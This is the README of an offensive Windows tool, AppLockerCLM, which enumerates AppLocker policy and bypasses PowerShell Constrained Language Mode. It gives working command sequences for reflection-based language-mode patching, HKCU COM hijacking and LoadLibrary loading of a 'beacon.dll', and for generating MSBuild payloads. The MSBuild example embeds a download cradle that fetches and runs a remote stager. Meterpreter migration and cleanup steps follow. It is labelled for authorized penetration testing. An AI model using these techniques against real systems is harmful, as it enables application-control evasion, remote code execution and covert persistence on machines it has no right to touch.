# AppLockerCLM

A .NET tool to enumerate AppLocker policies, detect PowerShell Constrained Language Mode (CLM), and execute payloads once inside an allowed path on locked-down Windows systems.

> **Note:** This tool assumes you already have execution from an AppLocker-allowed path. It is primarily an **AppLocker recon and CLM bypass** tool — not an initial execution bypass. To get initial execution, use `MSBuild.exe` (built-in, always allowed) or copy the binary to a known allowed path such as `C:\Windows\Temp`.

> **For authorized penetration testing and red team engagements only.**

---

## How It Works

AppLocker enforces CLM on `powershell.exe`. This tool is a **.NET executable**, not `powershell.exe` — it hosts the PowerShell runtime in-process and forces `FullLanguage` mode via reflection, bypassing AppLocker's CLM enforcement entirely.

Additional bypass methods are included for environments where the binary itself may be blocked.

---

## Build

Requires Visual Studio 2022 / MSBuild and .NET Framework 4.7.2.

```
build.bat
```

Output: `bin\Release\AppLockerCLM.exe` (x64)

---

## Commands

```
AppLockerCLM.exe [flags] [command] [args]

Flags:
  -q, --quiet    Suppress informational output
```

| Command | Description |
|---------|-------------|
| *(none)* | Auto recon — CLM status, AppLocker policy, writable paths, LOLBAS |
| `check` | Full AppLocker policy analysis: rules, wildcards, writable paths |
| `shell` | Interactive PowerShell in Full Language Mode |
| `exec <cmd>` | Run a single PS command in Full Language Mode |
| `script <path.ps1>` | Run a PS1 script in Full Language Mode |
| `msbuild <out.csproj>` | Generate MSBuild `.csproj` bypass payload |
| `loaddll <dll>` | Load DLL into current process via LoadLibrary (no child process, no registry) |
| `writable` | Find writable paths inside AppLocker allowed locations |
| `lolbas` | List available LOLBAS binaries |
| `comsetup <dll> [ProgID]` | Register HKCU COM hijack entry (no admin required) |
| `comload <ProgID\|{GUID}>` | Trigger DllMain via COM object load |
| `comclean <ProgID\|{GUID}>` | Remove HKCU COM hijack registry entries |
| `comlist` | List all COM hijack registrations in HKCU |

---

## Bypass Techniques

### CLM Bypass — In-Process Runspace Hosting
The tool creates a PowerShell runspace with `InitialSessionState.LanguageMode = FullLanguage` and patches `ExecutionContext._languageMode` via reflection. AppLocker CLM only applies to `powershell.exe` — not to custom .NET hosts.

```
AppLockerCLM.exe shell
AppLockerCLM.exe exec "whoami /all"
```

### COM Hijack — No Admin, Works Under CLM
`New-Object -ComObject` is on the CLM safe-cmdlet whitelist. HKCU COM registration requires no admin rights. When the COM object is loaded, `CoCreateInstance` loads the DLL into the process and `DllMain` fires.

```
AppLockerCLM.exe comsetup C:\Windows\Temp\beacon.dll MyApp.Bypass
AppLockerCLM.exe comload MyApp.Bypass
```

Or directly from any PowerShell session (works in CLM):
```powershell
New-Object -ComObject MyApp.Bypass
```

After getting a session, migrate and clean up:
```
meterpreter > migrate -N explorer.exe
AppLockerCLM.exe comclean MyApp.Bypass
```

### Direct DLL Load — LoadLibrary P/Invoke
Loads a DLL directly into the tool's own process. No child process spawned, no registry keys written. `DllMain(DLL_PROCESS_ATTACH)` fires immediately.

```
AppLockerCLM.exe loaddll C:\Windows\Temp\beacon.dll
```

### MSBuild Payload
Generates a `.csproj` file with inline C# that runs a Full Language PS runspace. `MSBuild.exe` lives in `%WINDIR%\Microsoft.NET\Framework64\` and is allowed by AppLocker's default publisher rules.

```
AppLockerCLM.exe msbuild bypass.csproj
[?] PowerShell command to embed: IEX(New-Object Net.WebClient).DownloadString('http://<IP>/stager.ps1')

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe bypass.csproj /t:Execute
```

### Orphaned COM Entries
`comlist` shows all HKCU `InprocServer32` registrations. Entries with `DLL exists: NO` are orphaned — drop your DLL at the listed path and load it without writing any new registry keys.

```
AppLockerCLM.exe comlist
```

---

## Notes

- Build and DLL payloads must match architecture — **x64 only**
- If using COM hijack, run `comsetup` and `comload` with the same binary (same bitness writes to the same registry hive)
- AppLocker DLL rules are disabled by default; if enabled, place the DLL inside an AppLocker-allowed path
